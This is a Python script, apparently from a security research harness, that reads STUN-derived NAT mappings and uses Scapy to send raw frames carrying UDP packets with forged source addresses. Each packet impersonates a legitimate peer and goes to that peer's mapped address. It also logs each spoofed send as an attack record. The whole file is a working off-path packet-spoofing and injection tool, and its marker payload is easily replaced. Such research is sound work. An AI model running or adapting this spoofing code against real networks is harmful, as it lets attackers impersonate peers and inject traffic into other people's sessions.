#!/usr/bin/env python3
"""Single-frame-per-peer Scapy L2 spoof sender for the fixed STUN mapping set."""
import json, pathlib, subprocess, time
from scapy.all import Ether, IP, UDP, Raw, sendp, get_if_hwaddr, getmacbyip

root=pathlib.Path("offpath-fixed-results"); root.mkdir(parents=True,exist_ok=True)
p=root/"mappings.json"; deadline=time.time()+240
while not p.exists() and time.time()<deadline: time.sleep(1)
if not p.exists(): raise SystemExit("TIMEOUT waiting for fixed STUN mappings")
obj=json.loads(p.read_text()); mappings=obj.get("mappings",[])
if not mappings: raise SystemExit("FAIL no confirmed peer mappings")
try:
    attacker_ip=subprocess.run(["curl","-4","--connect-timeout","5","--max-time","10","-fsS","https://api.ipify.org"],capture_output=True,text=True,timeout=15).stdout.strip() or "UNKNOWN"
except Exception: attacker_ip="UNKNOWN"
route=subprocess.check_output(["route","-n","get","default"],text=True)
iface=next((x.split(":",1)[1].strip() for x in route.splitlines() if x.strip().startswith("interface:")),None)
gateway=next((x.split(":",1)[1].strip() for x in route.splitlines() if x.strip().startswith("gateway:")),None)
if not iface or not gateway: raise SystemExit("FAIL no interface/gateway")
smac=get_if_hwaddr(iface); dmac=getmacbyip(gateway)
if not dmac: raise SystemExit("FAIL no gateway MAC")
records=[]
for idx,row in enumerate(mappings):
    payload=f"OFFPATH-FIXED-{idx}".encode()
    frame=Ether(src=smac,dst=dmac)/IP(src=row["peer_ip"],dst=row["mapped_ip"],ttl=64,id=0x6200+idx)/UDP(sport=int(row["peer_port"]),dport=int(row["mapped_port"]))/Raw(load=payload)
    b=bytes(frame); check=Ether(b)
    if len(check[IP]) != 20+8+len(payload): raise SystemExit("bad IPv4 total length")
    rec={"index":idx,"name":row["name"],"attacker_public_ip":attacker_ip,"spoofed_source":f'{row["peer_ip"]}:{row["peer_port"]}',"target":f'{row["mapped_ip"]}:{row["mapped_port"]}',"frame_bytes":len(b),"ipv4_checksum":hex(check[IP].chksum),"udp_checksum":hex(check[UDP].chksum)}
    print("ATTACK_IDENTITY="+json.dumps(rec,sort_keys=True),flush=True)
    sendp(frame,iface=iface,count=1,verbose=False)
    records.append(rec)
(root/"attacker-sends.json").write_text(json.dumps(records,indent=2)+"\n")
print(f"SENDP_COMPLETED={len(records)}",flush=True)
